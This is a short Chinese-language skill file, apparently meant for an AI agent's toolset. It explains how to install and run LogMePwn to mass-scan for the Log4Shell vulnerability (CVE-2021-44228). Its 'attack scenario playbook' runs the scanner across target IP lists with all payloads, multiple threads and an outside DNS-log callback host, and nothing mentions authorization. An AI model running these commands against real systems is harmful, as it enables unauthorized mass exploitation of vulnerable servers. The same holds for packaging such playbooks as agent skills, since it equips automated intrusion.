---
name: logmepwn-log4j-mass
description: LogMePwn: Log4Shell 全网批扫。信号:漏洞情报,cve,Log4Shell 批量,全 payload,线程。
---

# LogMePwn

- 攻击大类:C06 漏洞情报与漏洞库
- 上游仓库:https://github.com/0xInfection/LogMePwn
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/0xInfection/LogMePwn && cd LogMePwn && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `lmp -targets urls.txt -callback x.dnslog.cn` | Log4Shell 批量 |
| `-targets file -payload all` | 全 payload |
| `-threads 50` | 线程 |

## 攻击场景 Playbook

### Log4Shell 全网批扫

```bash
lmp -targets ips.txt -callback vps.dnslog.cn
# 大规模 CVE-2021-44228
```

## 注意事项

Log4Shell 批量扫描器,多协议支持。
